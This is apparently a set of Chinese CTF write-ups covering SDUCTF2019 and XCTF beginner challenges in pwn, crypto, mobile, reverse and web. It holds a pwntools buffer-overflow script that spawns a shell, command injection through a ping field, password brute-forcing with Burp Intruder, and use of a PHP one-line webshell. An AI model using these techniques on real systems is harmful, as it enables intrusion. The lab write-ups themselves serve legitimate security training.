#sh = process(./stackoverflow) success_addr=0x08048486 #payload = 'a' * 0x14 + 'bbbb' + p32(success_addr) payload = 'a' * 0x14 + 'bbbb' + '\\x86\\x84\\x04\\x08' print(p32(success_addr) #out\u003e\u003e\u003eb'\\x86\\x84\\x04\\x08' sh.sendline(payload) sh.interactive()   用pwntools直接构造exp，getshell，获得flag\n其中遇到了一个编码问题：\n因为地址用p32转成地址形式为b'\\x86\\x84\\x04\\x08所以一直编码不成功，导致payload连接失败不能成功getshell\n在decode时使用'ignore'模式，\\x86\\x84两个字符会被忽略，说明是非法字符。\n不懂是啥错误！！\npwn自带的flat方法可以拼接字符串避开str连接的错误，flat方法传入一个列表list[]，list里放所需要拼接的对象 ： payload = flat(['a'*24,'bbbb',addr])\n还有执行elf文件，由于我的系统是64bitUbuntu，执行32bitELF文件需要安装以下包\n1  sudo apt install lib32ncurses5 lib32z1   Crypto 0x01 Base  题目描述：[https://baike.baidu.com/item/贝斯/]\n奇怪的链接\n 题目直接给了两个链接，不过第二个如下\nZmxhZ3tiYXNlNjRfaXNfbm90X2FuX2VuY3J5cHRpb25fbWV0aG9kfQ 直接扔base64去解码，得到flag：flag{base64_is_not_an_encryption_method}\n0x02 诡异的数字  题目描述：摩同学做ctf到深夜，点开这道题却发现网安实验室里的灯突然有规律的时暗时亮，十分诡异。难道这代表着什么？ 他用颤抖的双手记下了下面这段文字。你能发现其中的奥秘吗？ 11 111 010 000 0 11111 00 000 11111 00 10 1 0 010 0 000 1 00 10 110\nflag格式为sductf{xxxxxxxxxx}\n 既然是摩同学，那么直接放莫斯解码即可，字符串利用python脚本的str.replae()方法替换成.-即可，即1对应-，2对应.，解得flag。\n0x03 九宫格  题目描述：无论是搜狗输入法还是百度输入法还是QQ输入法还是讯飞输入法还是谷歌输入法还是..........都有9宫格，所以这个题目炒鸡简单\n7426366432983 解出来的明文赋值给x\nflag为 flag{ md5(x+md5(x,16), 32) } (结果没有空格，x+ 表示的是x与另一个字符串进行拼接）\n 一串数字通过经典的九宫格打出来是山东大学四个字\n然后通过python的hashlib.md5()就可以算出flag\nmd5的16位百度得知是截取32位md5中间的16位\n1 2 3 4  import hashlib s = \"山东大学\" mobj = hashlib.md5(s.encode('utf-8')).hexdigest()[8:24] ans = hashlib.md5(str(s+mobj).encode('utf-8')).hexdigest()   1 2 3 4 5 6 7 8  \u003e\u003e\u003e import hashlib \u003e\u003e\u003e s = \"山东大学\" \u003e\u003e\u003e mobj = hashlib.md5(s.encode('utf-8')).hexdigest()[8:24] \u003e\u003e\u003e mobj 'f09383b061bb3c9f' \u003e\u003e\u003e ans = hashlib.md5(str(s+mobj).encode('utf-8')).hexdigest() \u003e\u003e\u003e ans 'ecf506190946c4e8d06d53e14191329e'   0x04 键盘追踪  题目描述：键盘是个画板，如果你的键盘有灯光应该会简单点\nrfsdsz tfvbhy ijnm ijnm tfvbhy wsxdcft vgyhujm hjuygbn\n还原出明文后请自行拼接flag{}\n 之前在成都大学的ctf比赛中看过键盘密码，看题目描述应该是按键盘位置画出字母来，但是我比划出olloWMe后七个字母，硬是没看懂第一个字符是啥，然后将那些字符扔去百度，搜索得到的时FollowMe，尝试一波，果然是flag。\n（至今为止我都不知道第一个为啥时F\n0x05 宇宙终极问题  题目描述：Do you know The Answer to the Ultimate Question of Life, The Universe, and Everything?\nGive me 3 integers, x, y, and z, such that x^3 + y^3 + z^3 = 42\n得到x、y、z后请把它们乘起来，然后包裹上flag{}\n 直接百度得到解如下，扔进python跑一波大数乘法\n1 2 3 4 5 6 7  \u003e\u003e\u003e x = -80538738812075974 \u003e\u003e\u003e y = 80435758145817515 \u003e\u003e\u003e z = 12602123297335631 \u003e\u003e\u003e x**3+y**3+z**3 42 \u003e\u003e\u003e x*y*z -81639006040518590050493906720365515701570561538910   0x06 秘密报文  题目描述：在第一次世界大战期间，法国陆军捕获到一份秘密报文，交给中尉Georges Painvin尝试破解。\n报文内容如下： XX DF GG AF XD XF AF XD XF AF AG DD AF GF DX XF XD\n解密之后请自行拼接flag{}提交\n 我记得之前做题时有看见过类似密码，但是忘了是啥。\n最明显的，先把中尉名字Georges Painvin百度一波，得知时ADFGVX密码对照密码表，解得flag：flag{youarearealhacker}\n0x07 ok?  题目描述：\n就问你ok不ok\nOok. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook# Ook. Ook# Ook! Ook. Ook# Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook# Ook! Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook# Ook. Ook# Ook! Ook. Ook# Ook. Ook. Ook. Ook. Ook! Ook. Ook# Ook.\n 既然是密码题，那就百度呗\n搜索的是ok密码，文章和转换的github地址如下\n https://www.splitbrain.org/services/ook\nhttps://github.com/splitbrain/ook\n 不过有点不对，观察样例密码，把#换成?，解得flag\n0x08 什么密码？  题目描述：\nEVA给Tom发了一封邮件，但是Tom却看不懂EVA想表达什么，请你向Tom解释一下这封邮件\n发件人：EVA 收件人：Tom Pxevhfxmhietrpbmamablztfx\nflag格式：sductf{+.}\nThe answer is related to my favorite movie.\n 密码可能做着做着心态崩了，不小心把Crypto当misc做了\n把图片下下来，没注意到图片上到Cesar，binwalk跑一波图片，发下里面还有一个zlib，百度解zlib，然后疯狂报错，贼难受，然后看了hint，得知凯撒密码\n难受 -600point\n位移几位忘了。\nAnd 十分真实，都把顺序放我TODO List下了，妈耶\n什么密码？https://blog.csdn.net/qq_40574571/article/details/80164981\n0x09 Mix  题目描述：解开她，flag就是你的了\nJiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzM7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzE7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzY7JiN4MzI7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzg7JiN4MjU7JiN4MzM7JiN4MzU7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzg7JiN4MjU7JiN4MzM7JiN4MzU7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzM7JiN4MzM7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzI7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4Mzk7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzA7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzM7JiN4MzQ7JiN4MjU7JiN4MzM7JiN4MzY7JiN4MjU7JiN4MzY7JiN4MzY7JiN4MjU7JiN4MzM7JiN4Mzc7JiN4MjU7JiN4MzY7JiN4MzQ7\n 一看这种就是混合密码，靠直觉先解一波base64，然后发下可以解下去，发一波解密顺序，忘记录flag了。\n（base64-\u003eunicode-\u003e转中文（utf-8)-\u003eurldecode-\u003ehex decode） Mobile 0x01 apk1  题目描述：用着安卓手机，你懂apk吗？\n 通过工具d2j-dex2jar和jd-gui两者逆向apk得到flag\n0x02 apk2  题目描述： 你真的懂apk吗？\n 通过工具d2j-dex2jar和jd-gui两者逆向apk得到flag\n然后看代码可知是对字符串进行一个排序，将字符串里的第i位放到s2[i]位，得到结果\n直接写一个python脚本得到flag\n0x03 apk3  题目描述：再来一发，听说过Kotlin吗？\n 下下来解压按套路拖给d2j-dex2jar然后发现有两个.dex后缀的文件，逆向报错\n于是现去网上下了一个jeb逆向，然后找一个样例现学jeb\n直觉看这个字符串有用，然后在下面果然发现\nplay函数就是对这个字符串进行比对，就是将字符串的偶数位的ascii值减2，得到新串与该字符串进行比较\n写个python脚本逆着加回去可得flag\napk3：sductf{Easy_Apk_1s_n0t_hard_4_U!}\n1 2 3 4 5 6 7 8 9 10 11  \u003e\u003e\u003ef 'a2P1W3Pmc0Tha3jfOX@rVzDzV22wbF7oWXHkVzPfTSD9' \u003e\u003e\u003e for i in f: ... if cnt%2 == 0: ... s += chr(ord(i)+2) ... else: ... s+=i ... cnt += 1 ... \u003e\u003e\u003e s 'c2R1Y3Rme0Vhc3lfQXBrXzFzX24wdF9oYXJkXzRfVSF9'   0x04 FuckAPP  题目描述： 你真的懂apk吗？\n 常规，拖进jeb看main函数，发现只有一些setViewID之类的函数并没有主要的逻辑，于是回去将apk解压缩\n发现包里和以前的apk解压不同，apk3是多了一个Kotlin文件夹，而这个fuck app 是多了一个lib文件夹，猜主要的函数在里面，打开lib/arm64-v8a得到一个libnative-lib.so，拖进IDA里进行逆向\n暴力搜一波果然看到了flag，直接得到flag，还以为要看函数逻辑。\nReverse 0x01 Java jar  题目描述： 都是java程序员，互相偷个代码谁不会呀！\n 下载附件得到jar包，直接解压得到文件，打开main.class，看到flag明文就在main.class里\n0x02 C#  题目描述： C#简直跟java一样，会java就自然上手c#了。\n 下载附件得到sductf.exe，拖入辣个女人ida进行逆向，直接得到flag\n0x03 Rust  题目描述： 你听说过Rust语言吗？ 据说它非常安全。\n 没接触过rust语言，不过据说逆向不知道程序逆向结构时，最好自己写个程序HelloWorld进行逆向一波看结构，但是我偷懒了。\n直接百度搜索：rust逆向\nhttps://www.anquanke.com/post/id/169970\nhttps://blog.csdn.net/qq_33438733/article/details/81138573\n看完链接之后打开ida，还需要64bit的辣个女人。\n乱逛发现有一个字符串，但是解码出来是一个奇怪的东西，继续找主函数main\n主函数入口\n点进第一个函数查看流程\n既然是逆向，那就从尾部往后面看，果然看到一个判断和一个类似flag的字符串c2R1Y3Rme0lfbDB2ZV9ydXN0X2hoaGh9，base64解码得到flag：sductf{I_l0ve_rust_hhhh}\n0x04 EasyCrackMe  题目描述：无\n 下下来是一个exe文件，用010editor打开，发现说是PE文件，而且也发现是PE文件头，于是拖进去IDA逆向。\n逆向main函数无思路，便开TextView查看，看到如下图黄色字符串感觉很奇怪，而且下面有一个Congratulations！，猜测这段字符串是flag\nF5进入查看具体函数，大概是对输入字符串的每一位与0x16进行异或得到v5字符串\n于是用python逆函数一波，果然得到flag\n在后面写wp时，完善了思路。\n因为进去运行提示输入一个key，然后就在IDA的TextView搜索key，得到第一张图的函数入口，接下来看逻辑即可。\n","description":"","tags":["ctf"],"title":"SDUCTF2019-wp","uri":"/posts/sductf2019-wp/"},{"categories":["web"],"content":"Web\u0026WriteUp Web如同一座正三角冰山，等着去探索。。。\n攻防世界\u0026Web新手练习区 0x01 view_source  题目描述：X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。\n 利用view-source://url或者f12或者右键查看源码，flag就在源码里\n0x02 get_post  题目描述：X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？\n 利用burp suite 发包得到flag\n另一种思路是利用python的requests库发送请求。\n0x03 robots  题目描述：X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。\n 查看源码肯定是没有flag的，根据题目robots可联想到web的robots.txt协议\n robots.txt协议是在Web站点的根目录下设置一个robots.txt文件，规定站点上的哪些区域或者哪些页面是限制搜索的。搜索程序将参考该文件，决定站点中的哪些区域是不允许搜索的，并在接下来的搜索过程中跳过这些区域。\n下面是一个例子：\n#robots.txt for http://somehost.com User-agent: * Disallow: /cgi-bin Disallow: /registration 示例中第一行是一行注释，注释以一个#开头。\n User-agent：指访问站点的程序，每个浏览器都有一个唯一的User-agent值，浏览器在向Web服务器发送请求时会在每个请求中都附加这个值。Web站点通过在robots.txt中使用User-agent就可以针对不同的User-agent设置不同的规则。 Disallow是拒绝语句，定义了搜索程序不允许访问的Web站点路径。拒绝语句只针对路径进行设置，不针对具体的文件。   直接访问http://xxx.xxx.xxx.xxx/robots.txt\n得到一个php路径，直接访问得到flag\n0x04 backup  题目描述：X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！\n php的备份有两种：.php~和.php.bak\n如果网站存在备份文件，在地址栏最末加上/index.php~或/index.php.bak，即可得到备份文件 index.php.bak\n访问 http://url/index.php.bak 即自动下载了index.php.bak，打开查看flag就在里面\n0x05 cookie  题目描述：X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’\n chrome在console中输入命令javascript:alert(document.cookie) \n其实在地址栏输入也可以实现\n弹出 look-here=cookie.php\n访问url/cookie.php看到See the http response\n打开F12开发者模式的Network，查看cookie.php的回应，Response里没找到flag，最后在Response Headers里找到flag\n0x06 disabled button  题目描述：X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？\n 明显是一个灰色的按钮，查看源码有\u003cbutton disabled\u003e跟hackergame2019的签到题一样，把disabled删掉点击按钮即可。\n0x07 simple_js  题目描述：小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} )\n 先输入任意字符进入页面查看源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  \u003cscript\u003e function dechiffre(pass_enc){ var pass = \"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65\"; var tab = pass_enc.split(','); var tab2 = pass.split(',');var i,j,k,l=0,m,n,o,p = \"\";i = 0;j = tab.length; k = j + (l) + (n=0); n = tab2.length; for(i = (o=0); i \u003c (k = j = n); i++ ){o = tab[i-l];p += String.fromCharCode((o = tab2[i])); if(i == 5)break;} for(i = (o=0); i \u003c (k = j = n); i++ ){ o = tab[i-l]; if(i \u003e 5 \u0026\u0026 i \u003c k-1) p += String.fromCharCode((o = tab2[i])); } p += String.fromCharCode(tab2[17]); pass = p;return pass; } String[\"fromCharCode\"](dechiffre(\"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\")); h = window.prompt('Enter password'); alert( dechiffre(h) ); \u003c/script\u003e   看源码得知不论输入什么都会跳转至假密码然后失败，于是直接处理fromCharCode，得到flag\n1 2 3 4 5 6 7 8 9 10 11  \u003e\u003e\u003e s = \"\\x35\\x35\\x2c\\x35\\x36\\x2c\\x35\\x34\\x2c\\x37\\x39\\x2c\\x31\\x31\\x35\\x2c\\x36\\x39\\x2c\\x31\\x31\\x34\\x2c\\x31\\x31\\x36\\x2c\\x31\\x30\\x37\\x2c\\x34\\x39\\x2c\\x35\\x30\" \u003e\u003e\u003e print(s) \"55,56,54,79,115,69,114,116,107,49,50\" \u003e\u003e\u003e a = [55,56,54,79,115,69,114,116,107,49,50] \u003e\u003e\u003e s = \"\" \u003e\u003e\u003e for i in a: ... b =chr(i) ... s += b \u003e\u003e\u003e print(s) 786OsErtk12   0x08 xff referer  题目描述：X老师告诉小宁其实xff和referer是可以伪造的\n 直接访问网站，提示需要特定ip访问\n由题目描述猜想是改http请求，进行下一步.\n百度xff可知\n X-Forwarded-For位于HTTP协议的请求头， 是一个 HTTP 扩展头部。HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP。如今它已经成为事实上的标准，被各大 HTTP 代理、负载均衡等转发服务广泛使用，并被写入RFC 7239（Forwarded HTTP Extension）标准之中。\n 利用burpsuite直接伪造http header 的 X-Forwarded-For， X-Forwarded-For 请求头格式如下\nX-Forwarded-For: client, proxy1, proxy2 可以看到，XFF 的内容由「英文逗号 + 空格」隔开的多个部分组成，最开始的是离服务端最远的设备 IP，然后是每一级代理设备的 IP\n如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，IP 分别为 IP1、IP2、IP3，用户真实 IP 为 IP0，那么按照 XFF 标准，服务端最终会收到以下信息X-Forwarded-For: IP0, IP1, IP2\n PS： Remote Address 无法伪造，因为建立 TCP 连接需要三次握手，如果伪造了源 IP，无法建立 TCP 连接，更不会有后面的 HTTP 请求\n 然后得到如下页面\n百度Refer可知\n HTTP_REFERER提供了引导用户代理到当前页的前一页的地址信息，常见的一些应用场景有防盗链，统计文章有多少次是来自谷歌搜索结果，多少次来自百度搜索结果等。\n   什么时候获取不到HTTP_REFERER值  综上所述，HTTP_REFERER存在需要两个条件：\n浏览器（客户端）请求（服务器端请求的情况下，是不存在HTTP_REFERER的，但是可以伪造header，这在下一节中将提及）； 存在前导页；\n​\t以下是一些获取不到HTTP_REFERER值的情况：\n  在浏览器内直接敲URL\n  windows桌面上的超链接图标\n  浏览器内书签\n  第三方软件（如Word，Excel等）内容中的链接\n  SSL认证网站跳入\n  \u003c http://example.com/“\u003e meta页面设置自动跳转时，在example.com将取不到REFERER URL\n  使用JavaScript的Location.href或者是Location.replace()\n在以下情况下可以获取HTTP_REFERER值：\n  直接用form提交的表单(POST或GET)\n  src请求（如js的script标签及html中img标签的src属性）\n   直接伪造header的Referer属性\n但是没有得到结果\n后面百度发现，url/xxx和url/xxx/是不一样的，url/xxx是直接访问xxx的文件，而url/xxx/是访问xxx目录，因此我们刚才得不到flag，将Referer的后面的斜杠去掉，再次请求，得到flag\n0x09 weak_auth  题目描述：小宁写了一个登陆验证页面，随手就设了一个密码。\n 直接点login跳转到了check.php，提示：please login as admin\n用admin空密码去登陆，显示：password error\n点确认，F12查看源码\u003cscript\u003ealert('password error');\u003c/script\u003e\u003c!--maybe you need a dictionary--\u003e提示可能需要一个字典，肯定是爆破了\n因此，我去学习了BurpSuite的Intruder功能——用于爆破的一个工具。\n关于Burp Suite 的Intruder模块的四种选项的解释 https://howiezhao.github.io/2018/05/01/burpsuite-intruder-attack-type/\n关于BurpSuite的Intruder模块的解释： https://www.cnblogs.com/yufusec/p/9179625.html\n然后爆破得到密码123456，进入系统得到flag\n0x0a webshell  题目描述：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。\n  webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将 其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服 务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。 顾名思义，\"web\"的含义是显然需要服务器开放web服务，\"shell\"的含义是取得对服务器某 种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操 作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。 首先新建一个index.php文件，把PHP代码输入到里面，电脑可能会自动识别它为病毒，并 删除，可以恢复后使用\n 正如题目提示：php一句话——即php一句话木马： https://my.oschina.net/programs/blog/1649544\n了解之后，想用burpsuite的post请求发送也没能获取数据，于是看了wp，用中国蚁剑连了webshell，然后直接发现目录底下就有flag.txt。\n做完之后，查看官方wp，我也没弄懂他wp怎么用burpsuite去post数据来获取webshell（我回显不了数据\nupdate：post没有回显是因为我少了分号，还有就是hackbar的post没有发出去。后面成功用burpsuite发送post请求，成功执行命令。\n0x0b command execution  题目描述：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。\n 进入页面有个输入框，尝试输入127.0.0.1发现能够ping通并显示命令\n于是联想到命令拼接利用\u0026或|或；让我们的命令和ping一起执行，发现flag在/home/flag.txt里\n用find命令的时候，不知道为什么在他的shell里搜索的时候要带引号，即find / -name \"flag*\"才能成功执行命令回显，去掉引号即失败了。\n0x0c simple php  题目描述：小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  \u003c?php show_source(__FILE__); include(\"config.php\"); $a=@$_GET['a']; $b=@$_GET['b']; if($a==0 and $a){ echo $flag1; } if(is_numeric($b)){ exit(); } if($b\u003e1234){ echo $flag2; } ?\u003e  进入页面，见到如上php代码，应该是代码审计。\n即让a满足$a==0 and $a且b满足is_numeric($b)==flase\u0026$b\u003e1234得到两个flag\n php中的弱类型比较会使'abc' == 0为真，所以输入a=abc时，可得到flag1。（abc可换成任意字符）。\n  is_numeric() 函数会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE,且php中弱类型比较时，会使('1234a' == 1234)为真，所以当输入a=abc\u0026b=1235a，可得到flag2。\n  发现“0”为 true，所以可以把参数 a 构造为’0’或者‘alph’这种转换后为 0 但本身不为 False 的 形式 数字和字符混合的字符串转换为整数后只保留数字\n ","description":"","tags":["ctf","web"],"title":"XCTF-adworld-web-wp","uri":"/posts/xctf-adworld-web-wp/"},{"categories":["crypto"],"content":"Crypto\u0026WriteUp crypto永远充满了google和常识（还有工具\n攻防世界\u0026Crypto新手练习区 0x01 幂数加密  题目描述：你和小鱼终于走到了最后的一个谜题所在的地方，上面写着一段话“亲爱的朋友， 很开心你对网络安全有这么大的兴趣，希望你一直坚持下去，不要放弃 ，学到一些知识， 走进广阔的安全大世界”，你和小鱼接过谜题，开始了耐心细致的解答。flag为cyberpeace{你解答出的八位大写字母}\n 下载附件打开查看是txt，里面放一段数字\n8842101220480224404014224202480122 由ctf-wiki的常识可知，这是01248加密，即以0为分割，将其中的数加起来对应字母表的排位。\n解得flag\n01248： 23 5 12 12 4 15 14 5 w e l l d o n e 0x02 base64  题目描述：元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。 你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。\n 打开附件是一段英文，有题目得知是base64编码，解码得flag\nY3liZXJwZWFjZXtXZWxjb21lX3RvX25ld19Xb3JsZCF9 cyberpeace{Welcome_to_new_World!} 0x03 Caesar  题目描述：你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看 大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了\n 由题目得知是凯撒密码，随便百度一个工具进行暴力破解得知，移位12位\n快捷：算出o和c得插值，但是我觉得更慢\noknqdbqmoq{kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz} cyberpeace{you_have_learned_caesar_encryption} 0x04 Morse  题目描述：小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来 这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”(flag格式为cyberpeace{xxxxxxxxxx},均为小写)\n 下载附件，打开文档是一串01串\n11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110 假如按1:=.\u00260:=-翻译则第一个字母可翻译，但是后面有一个字符无法翻译\n因此，01调换顺序1:=-\u00260:=.\n利用python的str.replace的到.-的morsecode，找个在线工具直接翻译得到结果，需要自己加上cyberpeace{}格式：cyberpeace{morsecodeissointeresting}\nmorsecodeissointeresting 可惜我后来没注意到需要全部小写，浪费了时间。\n0x05 Railfence  题目描述：被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的 图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。\n 打开附件是一个文档如下，如题目明显的是栅栏加密。找了个在线工具破解。\nccehgyaefnpeoobe{lcirg}epriec_ora_g 